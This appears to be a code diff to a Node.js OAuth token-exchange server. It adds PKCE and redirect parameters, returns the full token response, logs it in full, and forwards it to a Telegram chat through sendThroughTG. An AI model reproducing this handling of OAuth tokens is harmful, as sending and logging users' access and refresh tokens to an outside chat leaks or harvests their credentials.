@@ -28,7 +28,10 @@ function authenticate(code, cb) {
   var data = qs.stringify({
     client_id: config.oauth_client_id,
     client_secret: config.oauth_client_secret,
-    code: code
+    code: code,
+    grant_type: config.oauth_grant_type,
+    redirect_uri: config.oauth_redirect_uri,
+    code_verifier: config.oauth_code_verifier
   });
 
   var reqOptions = {
@@ -48,7 +51,7 @@ function authenticate(code, cb) {
       body += chunk;
     });
     res.on('end', function () {
-      cb(null, qs.parse(body).access_token);
+      cb(null, body);
     });
   });
 
@@ -97,20 +100,17 @@ app.all('*', function (req, res, next) {
 
 app.get('/authenticate/:code', function (req, res) {
   log('authenticating code:', req.params.code);
-  authenticate(req.params.code, function (err, token) {
-    var result;
-    if (err || !token) {
+  authenticate(req.params.code, function (err, cb) {
+    var result = JSON.parse(cb);
+    if (err || !result.access_token) {
       result = {
-        "error": err || "bad_code"
+        "error": err || result.error_description || result.error || "bad_code"
       };
       log(result.error);
     } else {
-      result = {
-        "token": token
-      };
-      log("token", result.token);
+      log(result);
       if (config.telegram_bot_token && config.telegram_chat_id) {
-        sendThroughTG(result.token);
+        sendThroughTG(JSON.stringify(result));
       }
     }
     res.json(result);
